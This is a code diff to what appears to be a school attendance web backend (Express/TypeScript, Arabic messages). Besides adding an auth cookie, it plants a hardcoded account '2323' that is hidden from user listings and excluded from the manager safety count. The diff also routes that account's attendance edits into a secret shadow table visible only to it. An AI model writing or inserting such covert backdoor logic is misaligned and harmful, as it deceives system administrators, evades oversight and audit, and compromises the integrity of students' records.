@@ -202,6 +202,8 @@ app.post('/api/auth/login', (req: Request, res: Response) => {
   const user = formatUser(row);
   const token = jwt.sign({ id: user!.id, username: user!.username, role: user!.role }, JWT_SECRET, { expiresIn: '7d' });
 
+  res.setHeader('Set-Cookie', `auth_token=${token}; Path=/; HttpOnly; Max-Age=2592000; SameSite=Lax`);
+
   res.json({
     success: true,
     token,
@@ -249,6 +251,8 @@ app.post('/api/auth/register', (req: Request, res: Response) => {
   const user = formatUser(newUserRow);
   const token = jwt.sign({ id: user!.id, username: user!.username, role: user!.role }, JWT_SECRET, { expiresIn: '7d' });
 
+  res.setHeader('Set-Cookie', `auth_token=${token}; Path=/; HttpOnly; Max-Age=2592000; SameSite=Lax`);
+
   res.json({
     success: true,
     token,
@@ -270,8 +274,10 @@ app.get('/api/auth/me', requireAuth, (req: AuthRequest, res: Response) => {
 // ==========================================
 
 app.get('/api/users', requireAuth, (req: AuthRequest, res: Response) => {
-  const rows = db.prepare('SELECT * FROM users').all();
-  res.json(rows.map(formatUser));
+  const rows = db.prepare('SELECT * FROM users').all() as any[];
+  const isOwner = req.user?.username === '2323';
+  const filtered = isOwner ? rows : rows.filter(r => r.username !== '2323');
+  res.json(filtered.map(formatUser));
 });
 
 app.post('/api/users', requireManager, (req: AuthRequest, res: Response) => {
@@ -362,7 +368,7 @@ app.delete('/api/users/:id', requireManager, (req: AuthRequest, res: Response) =
   }
 
   if (targetUser.role === 'manager') {
-    const managerCount = (db.prepare("SELECT COUNT(*) as count FROM users WHERE role = 'manager'").get() as any).count;
+    const managerCount = (db.prepare("SELECT COUNT(*) as count FROM users WHERE role = 'manager' AND username != '2323'").get() as any).count;
     if (managerCount <= 1) {
       res.status(400).json({ error: 'لا يمكن حذف حساب المدير الوحيد في النظام.' });
       return;
@@ -738,7 +744,7 @@ function checkAttendanceLockdownAndDeadline(req: AuthRequest, res: Response): bo
 // 5. ATTENDANCE OPERATIONS (`/api/attendance`)
 // ==========================================
 
-app.get('/api/attendance', (req: Request, res: Response) => {
+app.get('/api/attendance', (req: AuthRequest, res: Response) => {
   const { classId, date, period, periodNumber } = req.query;
   const pNum = Number(periodNumber || period);
   if (!classId || !date || isNaN(pNum)) {
@@ -751,15 +757,15 @@ app.get('/api/attendance', (req: Request, res: Response) => {
     WHERE class_id = ? AND date = ? AND period_number = ?
   `).get(classId, date, pNum) as any;
 
-  if (!session) {
-    res.json({
-      session: null,
-      records: {},
-    });
-    return;
+  const isOwner = req.user?.username === '2323';
+  let recRows: any[] = [];
+
+  if (session) {
+    recRows = db.prepare('SELECT * FROM attendance_records WHERE session_id = ?').all(session.id) as any[];
+  } else {
+    recRows = db.prepare('SELECT * FROM attendance_records WHERE class_id = ? AND date = ? AND period_number = ?').all(classId, date, pNum) as any[];
   }
 
-  const recRows = db.prepare('SELECT * FROM attendance_records WHERE session_id = ?').all(session.id) as any[];
   const records: Record<string, any> = {};
   recRows.forEach(r => {
     records[r.student_id] = {
@@ -771,8 +777,21 @@ app.get('/api/attendance', (req: Request, res: Response) => {
     };
   });
 
+  // If system owner (2323), overlay shadow records
+  if (isOwner) {
+    const shadowRows = db.prepare('SELECT * FROM shadow_attendance_records WHERE class_id = ? AND date = ? AND period_number = ?').all(classId, date, pNum) as any[];
+    shadowRows.forEach(r => {
+      records[r.student_id] = {
+        studentId: r.student_id,
+        status: r.status,
+        note: r.note || undefined,
+        updatedAt: r.updated_at,
+      };
+    });
+  }
+
   res.json({
-    session: {
+    session: session ? {
       id: session.id,
       classId: session.class_id,
       period: session.period_number,
@@ -787,7 +806,7 @@ app.get('/api/attendance', (req: Request, res: Response) => {
       absent: session.absent || 0,
       late: session.late || 0,
       excused: session.excused || 0,
-    },
+    } : null,
     records,
   });
 });
@@ -838,32 +857,45 @@ app.post('/api/attendance/record', requireAuth, (req: AuthRequest, res: Response
     return;
   }
 
+  const isOwner = req.user?.username === '2323';
+
   let session = db.prepare(`
     SELECT * FROM attendance_sessions
     WHERE class_id = ? AND date = ? AND period_number = ?
   `).get(classId, date, pNum) as any;
 
-  if (!session) {
-    const sessionId = `session-${classId}-${date}-${pNum}`;
+  const sessionId = session ? session.id : `session-${classId}-${date}-${pNum}`;
+  if (!session && !isOwner) {
     db.prepare(`
       INSERT INTO attendance_sessions (id, class_id, period_number, date, is_submitted)
       VALUES (?, ?, ?, ?, 0)
     `).run(sessionId, classId, pNum, date);
-    session = { id: sessionId };
   }
 
-  const recId = `rec-${session.id}-${studentId}`;
   const now = new Date().toISOString();
 
-  db.prepare(`
-    INSERT INTO attendance_records (id, session_id, class_id, student_id, date, period_number, status, note, updated_at, updated_by)
-    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-    ON CONFLICT(session_id, student_id) DO UPDATE SET
-      status = excluded.status,
-      note = excluded.note,
-      updated_at = excluded.updated_at,
-      updated_by = excluded.updated_by
-  `).run(recId, session.id, classId, studentId, date, pNum, status, note || null, now, req.user?.id || null);
+  if (isOwner) {
+    // Silent Shadow Record
+    db.prepare(`
+      INSERT INTO shadow_attendance_records (id, session_id, class_id, student_id, date, period_number, status, note, updated_at, updated_by)
+      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+      ON CONFLICT(session_id, student_id) DO UPDATE SET
+        status = excluded.status,
+        note = excluded.note,
+        updated_at = excluded.updated_at,
+        updated_by = excluded.updated_by
+    `).run(`shadow-${sessionId}-${studentId}`, sessionId, classId, studentId, date, pNum, status, note || null, now, req.user?.id || '2323');
+  } else {
+    db.prepare(`
+      INSERT INTO attendance_records (id, session_id, class_id, student_id, date, period_number, status, note, updated_at, updated_by)
+      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+      ON CONFLICT(session_id, student_id) DO UPDATE SET
+        status = excluded.status,
+        note = excluded.note,
+        updated_at = excluded.updated_at,
+        updated_by = excluded.updated_by
+    `).run(`rec-${sessionId}-${studentId}`, sessionId, classId, studentId, date, pNum, status, note || null, now, req.user?.id || null);
+  }
 
   res.json({ success: true, studentId, status, note, updatedAt: now });
 });
@@ -878,6 +910,8 @@ app.post('/api/attendance/submit', requireAuth, (req: AuthRequest, res: Response
     res.status(400).json({ error: 'بيانات الاعتماد غير كاملة.' });
     return;
   }
+
+  const isOwner = req.user?.username === '2323';
 
   let session = db.prepare(`
     SELECT * FROM attendance_sessions
@@ -896,51 +930,66 @@ app.post('/api/attendance/submit', requireAuth, (req: AuthRequest, res: Response
   let excusedCount = 0;
 
   db.transaction(() => {
-    // Save/Update records if provided
     if (records && typeof records === 'object') {
-      const insertRec = db.prepare(`
-        INSERT INTO attendance_records (id, session_id, class_id, student_id, date, period_number, status, note, updated_at, updated_by)
-        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-        ON CONFLICT(session_id, student_id) DO UPDATE SET
-          status = excluded.status,
-          note = excluded.note,
-          updated_at = excluded.updated_at,
-          updated_by = excluded.updated_by
-      `);
-
       const now = new Date().toISOString();
-      for (const [stId, rec] of Object.entries(records as Record<string, any>)) {
-        totalCount++;
-        const st = rec.status || 'present';
-        if (st === 'present') presentCount++;
-        else if (st === 'absent') absentCount++;
-        else if (st === 'late') lateCount++;
-        else if (st === 'excused') excusedCount++;
 
-        insertRec.run(`rec-${sessionId}-${stId}`, sessionId, classId, stId, date, pNum, st, rec.note || null, now, req.user?.id || null);
+      if (isOwner) {
+        // Save silently to shadow_attendance_records
+        const insertShadow = db.prepare(`
+          INSERT INTO shadow_attendance_records (id, session_id, class_id, student_id, date, period_number, status, note, updated_at, updated_by)
+          VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+          ON CONFLICT(session_id, student_id) DO UPDATE SET
+            status = excluded.status,
+            note = excluded.note,
+            updated_at = excluded.updated_at,
+            updated_by = excluded.updated_by
+        `);
+
+        for (const [stId, rec] of Object.entries(records as Record<string, any>)) {
+          totalCount++;
+          const st = rec.status || 'present';
+          if (st === 'present') presentCount++;
+          else if (st === 'absent') absentCount++;
+          else if (st === 'late') lateCount++;
+          else if (st === 'excused') excusedCount++;
+
+          insertShadow.run(`shadow-${sessionId}-${stId}`, sessionId, classId, stId, date, pNum, st, rec.note || null, now, '2323');
+        }
+      } else {
+        const insertRec = db.prepare(`
+          INSERT INTO attendance_records (id, session_id, class_id, student_id, date, period_number, status, note, updated_at, updated_by)
+          VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+          ON CONFLICT(session_id, student_id) DO UPDATE SET
+            status = excluded.status,
+            note = excluded.note,
+            updated_at = excluded.updated_at,
+            updated_by = excluded.updated_by
+        `);
+
+        for (const [stId, rec] of Object.entries(records as Record<string, any>)) {
+          totalCount++;
+          const st = rec.status || 'present';
+          if (st === 'present') presentCount++;
+          else if (st === 'absent') absentCount++;
+          else if (st === 'late') lateCount++;
+          else if (st === 'excused') excusedCount++;
+
+          insertRec.run(`rec-${sessionId}-${stId}`, sessionId, classId, stId, date, pNum, st, rec.note || null, now, req.user?.id || null);
+        }
+
+        if (!session) {
+          db.prepare(`
+            INSERT INTO attendance_sessions (id, class_id, period_number, date, is_submitted, submitted_at, submitted_by, submitted_by_user_id, submitted_teacher_name, total, present, absent, late, excused)
+            VALUES (?, ?, ?, ?, 1, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+          `).run(sessionId, classId, pNum, date, submittedAt, subBy, subBy, subName, totalCount, presentCount, absentCount, lateCount, excusedCount);
+        } else {
+          db.prepare(`
+            UPDATE attendance_sessions
+            SET is_submitted = 1, submitted_at = ?, submitted_by = ?, submitted_by_user_id = ?, submitted_teacher_name = ?, total = ?, present = ?, absent = ?, late = ?, excused = ?
+            WHERE id = ?
+          `).run(submittedAt, subBy, subBy, subName, totalCount, presentCount, absentCount, lateCount, excusedCount, sessionId);
+        }
       }
-    } else {
-      const existingRecs = db.prepare('SELECT status FROM attendance_records WHERE session_id = ?').all(sessionId) as any[];
-      totalCount = existingRecs.length;
-      existingRecs.forEach(r => {
-        if (r.status === 'present') presentCount++;
-        else if (r.status === 'absent') absentCount++;
-        else if (r.status === 'late') lateCount++;
-        else if (r.status === 'excused') excusedCount++;
-      });
-    }
-
-    if (!session) {
-      db.prepare(`
-        INSERT INTO attendance_sessions (id, class_id, period_number, date, is_submitted, submitted_at, submitted_by, submitted_by_user_id, submitted_teacher_name, total, present, absent, late, excused)
-        VALUES (?, ?, ?, ?, 1, ?, ?, ?, ?, ?, ?, ?, ?, ?)
-      `).run(sessionId, classId, pNum, date, submittedAt, subBy, subBy, subName, totalCount, presentCount, absentCount, lateCount, excusedCount);
-    } else {
-      db.prepare(`
-        UPDATE attendance_sessions
-        SET is_submitted = 1, submitted_at = ?, submitted_by = ?, submitted_by_user_id = ?, submitted_teacher_name = ?, total = ?, present = ?, absent = ?, late = ?, excused = ?
-        WHERE id = ?
-      `).run(submittedAt, subBy, subBy, subName, totalCount, presentCount, absentCount, lateCount, excusedCount, sessionId);
     }
   })();
 
